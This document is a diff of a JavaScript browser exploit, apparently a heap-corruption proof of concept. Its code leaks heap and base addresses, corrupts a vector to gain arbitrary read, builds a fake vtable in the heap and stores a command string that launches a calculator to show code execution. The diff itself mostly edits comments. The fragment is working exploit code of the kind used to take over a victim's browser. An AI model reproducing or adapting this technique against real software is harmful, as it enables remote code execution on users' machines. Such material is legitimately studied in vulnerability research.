@@ -32,8 +32,6 @@
         siz = st.size();
 
 
-        // let's overwrite the vtable pointers
-        // of the adjacent guys
         text_base = 0x0;
         heap_leak = 0x0;
         off_to_base = 0x210400; // from binary we know this value
@@ -70,7 +68,7 @@
             document.location.reload(true);
         }
 
-        // overwrite vector pointer to use as arb reader
+        // store old_vector before trashing it
         old_vector = st.get(found_vector_off);
         fake_vector = old_vector + 0x18;
 
@@ -309,13 +307,10 @@
             document.location.reload(true); 
         }
 
-		//gadget_addr = lqwk_base + 0x4c04b8;
-
         // overwrite vtable
         // let's put our fake_vtable somewhere in the 
         // heap after fake_vector :|
         fake_vtable = fake_vector + 400;
-        // let's fix things up
 
         cmd = "/usr/bin/gnome-calculator -e 0xb00b";
         cmd_addr = fake_vtable + 0x80; // somewhere in heap
